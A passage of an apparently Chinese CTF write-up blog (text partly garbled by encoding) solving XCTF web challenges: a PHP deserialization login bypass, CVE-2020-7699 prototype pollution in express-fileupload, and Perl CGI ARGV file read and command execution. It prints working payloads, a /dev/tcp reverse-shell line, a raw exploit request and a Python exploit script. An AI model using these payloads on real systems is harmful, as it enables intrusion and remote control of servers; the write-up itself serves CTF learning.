</span></span><span class="line"><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">threads</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250131150053681.png"
	width="509"
	height="92"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250131150053681_hu14919838603237096518.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250131150053681_hu8740031831123649511.png 1024w"
	loading="lazy"
	
		alt="image-20250131150053681"
	
	
		class="gallery-image" 
		data-flex-grow="553"
		data-flex-basis="1327px"
	
></p>
<p>ç„¶åè®¿é—®shell.php,èšå‰‘è¿æ¥</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250131150118365.png"
	width="724"
	height="230"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250131150118365_hu3129424384619159249.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250131150118365_hu5445018704727670861.png 1024w"
	loading="lazy"
	
		alt="image-20250131150118365"
	
	
		class="gallery-image" 
		data-flex-grow="314"
		data-flex-basis="755px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250131150125648.png"
	width="1284"
	height="868"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250131150125648_hu12203235805707085652.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250131150125648_hu949963193443991761.png 1024w"
	loading="lazy"
	
		alt="image-20250131150125648"
	
	
		class="gallery-image" 
		data-flex-grow="147"
		data-flex-basis="355px"
	
></p>
<h2 id="é¢˜ç›®åç§°-warmup">é¢˜ç›®åç§°-warmup
</h2><p>é¢˜ç›®ç»™äº†é™„ä»¶</p>
<p>æ˜¯ç•Œé¢æºç </p>
<p>conn.phpå®šä¹‰ç±»SQLï¼Œåœ¨åé¢åŠ äº†wafï¼Œæ²¡æœ‰è¿‡æ»¤å•å¼•å·ï¼Œè¦æ±‚usernameæ˜¯admin</p>
<p>index.phpä¸­æŠŠcookieä¸­last_login_infoçš„å€¼è¿›è¡Œååºåˆ—åŒ–å’Œbase64ï¼Œè€Œä¸”æŠŠusernameå’Œpasswordè¿›è¡Œäº†è½¬ä¹‰è¿‡æ»¤ï¼Œè€Œtableæ²¡æœ‰è¿‡æ»¤</p>
<p>æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„tableï¼Œä»¤ä»–çš„åˆ—é‡Œé¢usernameä¸ºadmin</p>
<p>poc:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">SQL</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$table</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$conn</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span><span class="o">=</span><span class="k">new</span> <span class="nx">SQL</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="c1">//è¦å’Œè¡¨å†…çš„å­—æ®µå€¼ä¸€è‡´
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$o</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">//æ‹¬å·å¤–çš„aæ˜¯å­æŸ¥è¯¢è¡¨çš„åå­—
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$o</span><span class="o">-&gt;</span><span class="na">table</span><span class="o">=</span><span class="s2">&#34;(select &#39;admin&#39; username,&#39;1&#39; password)a&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸Šé¢çš„å­æŸ¥è¯¢è¢«å‘½åä¸º aã€‚è¿™æ„å‘³ç€æ•´ä¸ªå­æŸ¥è¯¢çš„ç»“æœä¼šè¢«è§†ä¸ºä¸€ä¸ªåä¸º a çš„è¡¨ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="n">password</span><span class="p">)</span><span class="n">a</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201104327265.png"
	width="1040"
	height="781"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201104327265_hu6579471837153687749.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201104327265_hu11553994111174020342.png 1024w"
	loading="lazy"
	
		alt="image-20250201104327265"
	
	
		class="gallery-image" 
		data-flex-grow="133"
		data-flex-basis="319px"
	
></p>
<h2 id="badprogrammer">BadProgrammer
</h2><p>ç›®å½•æ‰«æ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201131226076.png"
	width="1483"
	height="762"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201131226076_hu2679026719480006199.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201131226076_hu14307410497659881226.png 1024w"
	loading="lazy"
	
		alt="image-20250201131226076"
	
	
		class="gallery-image" 
		data-flex-grow="194"
		data-flex-basis="467px"
	
></p>
<p>staticä¸‹å¯èƒ½æœ‰ä¸œè¥¿</p>
<p>è¿™ä¸ªstatic../æ˜¯åˆ©ç”¨äº†nginxæºç æ³„éœ²æ¼æ´èƒ½çœ‹åˆ°æºç </p>
<p>æŸ¥çœ‹app.js</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">fileUpload</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express-fileupload&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">fileUpload</span><span class="p">({</span> <span class="nx">parseNested</span><span class="o">:</span> <span class="kc">true</span> <span class="p">}));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/4_pATh_y0u_CaNN07_Gu3ss&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;flag.ejs&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;index.ejs&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;listening&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Express server started on port %s at %s&#39;</span><span class="p">,</span> <span class="nx">server</span><span class="p">.</span><span class="nx">address</span><span class="p">().</span><span class="nx">port</span><span class="p">,</span> <span class="nx">server</span><span class="p">.</span><span class="nx">address</span><span class="p">().</span><span class="nx">address</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>postè®¿é—®//4_pATh_y0u_CaNN07_Gu3ss</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201131931953.png"
	width="1425"
	height="730"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201131931953_hu15366285220325289682.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201131931953_hu3338313991168673840.png 1024w"
	loading="lazy"
	
		alt="image-20250201131931953"
	
	
		class="gallery-image" 
		data-flex-grow="195"
		data-flex-basis="468px"
	
></p>
<p>è¯´flagåœ¨flag.txtä¸­</p>
<p>è¿™è¾¹æœ‰express-fileupload,æœç´¢åˆ°å­˜åœ¨CVE-2020-7699æ¼æ´</p>
<p>æŸ¥çœ‹package.jsonï¼Œexpress-fileuploadç‰ˆæœ¬ä¸º1.1.7,ä½äº1.1.9å­˜åœ¨æ¼æ´</p>
<p>æ¼æ´åŸç†ï¼šhttps://www.freebuf.com/vuls/246029.html</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201132504485.png"
	width="990"
	height="452"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201132504485_hu9551871758134051449.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201132504485_hu6740736284806348132.png 1024w"
	loading="lazy"
	
		alt="image-20250201132504485"
	
	
		class="gallery-image" 
		data-flex-grow="219"
		data-flex-basis="525px"
	
></p>
<p>åå¼¹shellé€šç”¨payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">x;process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c &#34;bash -i &amp;&gt; /dev/tcp/ip/prot 0&gt;&amp;1&#34;&#39;);x
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç”¨cpæŠŠflagå¤åˆ¶åˆ°ç›®å½•/app/static/js/flag.txtä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">x;process.mainModule.require(&#39;child_process&#39;).exec(&#39;cp /flag.txt /app/static/js/flag.txt&#39;);x
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œæœ‰ä¸¤ç§åŠæ³•</p>
<p>ä¸€ç§æ„é€ è¯·æ±‚åŒ…ï¼ˆç›´æ¥æŠ„ï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /4_pATh_y0u_CaNN07_Gu3ss HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 61.147.171.105:49310
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Connection: close
</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
</span></span><span class="line"><span class="cl">Content-Length: 289
</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data; boundary=---------------------------1546646991721295948201928333
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-----------------------------1546646991721295948201928333
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;__proto__.outputFunctionName&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">x;process.mainModule.require(&#39;child_process&#39;).exec(&#39;cp /flag.txt /app/static/js/flag.txt&#39;);x
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-----------------------------1546646991721295948201928333--
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201133615187.png"
	width="1435"
	height="740"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201133615187_hu5009734052187153325.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201133615187_hu2962450190724324532.png 1024w"
	loading="lazy"
	
		alt="image-20250201133615187"
	
	
		class="gallery-image" 
		data-flex-grow="193"
		data-flex-basis="465px"
	
></p>
<p>ç„¶åè®¿é—®ç›®å½•å³å¯</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201133625062.png"
	width="1202"
	height="739"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201133625062_hu16867493497912874261.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201133625062_hu16973844753487149611.png 1024w"
	loading="lazy"
	
		alt="image-20250201133625062"
	
	
		class="gallery-image" 
		data-flex-grow="162"
		data-flex-basis="390px"
	
></p>
<p>å¦ä¸€ç§ç”¨è„šæœ¬å‘åŒ…</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">resp1</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://</span><span class="si">{}</span><span class="s2">:</span><span class="si">{}</span><span class="s2">/</span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s1">&#39;61.147.171.105&#39;</span><span class="p">,</span> <span class="s1">&#39;49310&#39;</span><span class="p">,</span> <span class="s1">&#39;4_pATh_y0u_CaNN07_Gu3ss&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;__proto__.outputFunctionName&#39;</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl">        <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="kc">None</span><span class="p">,</span> <span class="s2">&#34;x;console.log(1);process.mainModule.require(&#39;child_process&#39;).exec(&#39;</span><span class="si">{cmd}</span><span class="s2">&#39;);x&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="s1">&#39;cp /flag.txt /app/static/js/flag.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">)})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">resp1</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="i-got-id-200">i-got-id-200
</h2><p>è¿›å…¥åœºæ™¯åæœ‰3ä¸ªé“¾æ¥ï¼Œç‚¹è¿›å»éƒ½æ˜¯.plæ–‡ä»¶ï¼Œ.plæ–‡ä»¶éƒ½æ˜¯ç”¨perlç¼–å†™çš„ç½‘é¡µæ–‡ä»¶ã€‚</p>
<p>å°è¯•åå‘ç°ï¼ŒFilesé“¾æ¥å¯ä»¥ä¸Šä¼ æ–‡ä»¶å¹¶æŠŠæ–‡ä»¶å†…å®¹æ‰“å°å‡ºæ¥ã€‚çŒœæƒ³åå°åº”è¯¥ç”¨äº†param()å‡½æ•°ã€‚</p>
<p><strong>param()å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªåˆ—è¡¨çš„æ–‡ä»¶ä½†æ˜¯åªæœ‰ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¼šè¢«æ”¾å…¥åˆ°ä¸‹é¢çš„æ¥æ”¶å˜é‡ä¸­ã€‚å¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªARGVçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆPerlä¼šå°†ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åè¯»å‡ºæ¥ã€‚å¯¹æ­£å¸¸çš„ä¸Šä¼ æ–‡ä»¶è¿›è¡Œä¿®æ”¹,å¯ä»¥è¾¾åˆ°è¯»å–ä»»æ„æ–‡ä»¶çš„ç›®çš„ã€‚</strong></p>
<p>æºç å¤§æ¦‚æ˜¯è¿™æ ·</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">use</span> <span class="n">strict</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">warnings</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">CGI</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">my</span> <span class="o">$</span><span class="n">cgi</span><span class="o">=</span> <span class="n">CGI</span><span class="o">-&gt;</span><span class="n">new</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">$</span><span class="n">cgi</span><span class="o">-&gt;</span><span class="n">upload</span><span class="p">(</span> <span class="s1">&#39;file&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="n">my</span> <span class="o">$</span><span class="n">file</span><span class="o">=</span> <span class="o">$</span><span class="n">cgi</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span> <span class="s1">&#39;file&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="k">while</span> <span class="p">(</span> <span class="o">&lt;$</span><span class="n">file</span><span class="o">&gt;</span> <span class="p">)</span> <span class="p">{</span> <span class="nb">print</span> <span class="s2">&#34;$_&#34;</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>bpéšä¾¿ä¸Šä¼ æ–‡ä»¶æŠ“åŒ…å…ˆå¤åˆ¶boundaryåˆ†å‰²çº¿</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201190445635.png"
	width="887"
	height="200"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201190445635_hu4718707887780812707.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201190445635_hu4677642020493025871.png 1024w"
	loading="lazy"
	
		alt="image-20250201190445635"
	
	
		class="gallery-image" 
		data-flex-grow="443"
		data-flex-basis="1064px"
	
></p>
<p>æŠŠæ–‡ä»¶åfilenameåˆ é™¤</p>
<p>ä¸Šä¼ ARGV</p>
<p>ç„¶ååœ¨urlåé¢æ‹¼æ¥ä»–çš„æœ¬åœ°æ–‡ä»¶</p>
<p>è¿™é‡Œç”¨bin/bashæ¥æ‰§è¡Œå‘½ä»¤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?/bin/bash -c ls /|
</span></span><span class="line"><span class="cl">è½¬ç å?/bin/bash%20-c%20ls${IFS}/|
</span></span><span class="line"><span class="cl">æˆ–è€…
</span></span><span class="line"><span class="cl">ç”¨?ls -l / |
</span></span><span class="line"><span class="cl">è½¬ç å?ls%20-l%20/%20|
</span></span></code></pre></td></tr></table>
</div>
</div><p>/bin/bash ä¸€æ—¦è¢«è®¿é—®è¾“å‡ºï¼Œå°±æ˜¯bashè¿è¡Œç¯å¢ƒï¼Œæ•´ä¸ªè¯­å¥çš„è¾“å‡ºç»“æœåœ¨shellçš„ç¼“å†²åŒºé‡Œï¼Œä¹Ÿå°±æ˜¯åå°æœåŠ¡å™¨æ‰èƒ½çœ‹åˆ°ï¼Œå¹¶ä¸ä¼šè¾“å‡ºåˆ°htmlæ ‡ç­¾ä¸­ã€‚åœ¨linuxé‡Œæˆ‘ä»¬åªéœ€è¦ç®¡é“æ“ä½œå°±å¯ä»¥æŒ‡å®šç»“æœçš„å­˜æ”¾ä½ç½®äº†ã€‚
<strong>Tipsï¼šPerl open()å‡½æ•°ä¼šé»˜è®¤æ‰“å¼€ä¸€ä¸ªç®¡é“ï¼</strong>
è¿™é‡Œåˆ©ç”¨Perl open()å‡½æ•°æ‰“å¼€çš„ç®¡é“ï¼Œè¿›è¡ŒåŠ«æŒï¼Œé€šè¿‡â€œ|â€œæ“ä½œç¬¦ï¼ŒæŠŠå†…å®¹å¼•å…¥open()å‡½æ•°å·²ç»æ‰“å¼€çš„ç®¡é“ä¸­ï¼Œå°±å¯ä»¥è¾“å‡ºåˆ°htmlæ ‡ç­¾ä¸­</p>
<p>å¦‚æœä¸æ‹¼æ¥ç®¡é“ç¬¦æ˜¯ä¸ä¼šå›æ˜¾çš„ï¼Œè€Œä¸”ls /ä¸­é—´çš„ç©ºæ ¼è¦ç”¨linuxçš„ç©ºæ ¼æ›¿ä»£ï¼Œè€Œä¸æ˜¯%20è¿™ç§urlç¼–ç </p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201191129662.png"
	width="1848"
	height="681"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201191129662_hu17323660611933119168.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201191129662_hu1666371653358939930.png 1024w"
	loading="lazy"
	
		alt="image-20250201191129662"
	
	
		class="gallery-image" 
		data-flex-grow="271"
		data-flex-basis="651px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201191145264.png"
	width="1865"
	height="725"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201191145264_hu3862563211647843805.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201191145264_hu18176634486710893055.png 1024w"
	loading="lazy"
	
		alt="image-20250201191145264"
	
	
		class="gallery-image" 
		data-flex-grow="257"
		data-flex-basis="617px"
	
></p>
<p>ç°åœ¨è§£é‡Šä¸Šä¼ ARGVèƒ½è¯»å–ä»»æ„æ–‡ä»¶çš„åŸç†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">$</span><span class="n">cgi</span><span class="o">-&gt;</span><span class="n">upload</span><span class="p">(</span> <span class="s1">&#39;file&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="n">my</span> <span class="o">$</span><span class="n">file</span><span class="o">=</span> <span class="o">$</span><span class="n">cgi</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span> <span class="s1">&#39;file&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="k">while</span> <span class="p">(</span> <span class="o">&lt;$</span><span class="n">file</span><span class="o">&gt;</span> <span class="p">)</span> <span class="p">{</span> <span class="nb">print</span> <span class="s2">&#34;$_&#34;</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸Šé¢è¿™æ®µä»£ç æœ‰æ¼æ´</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
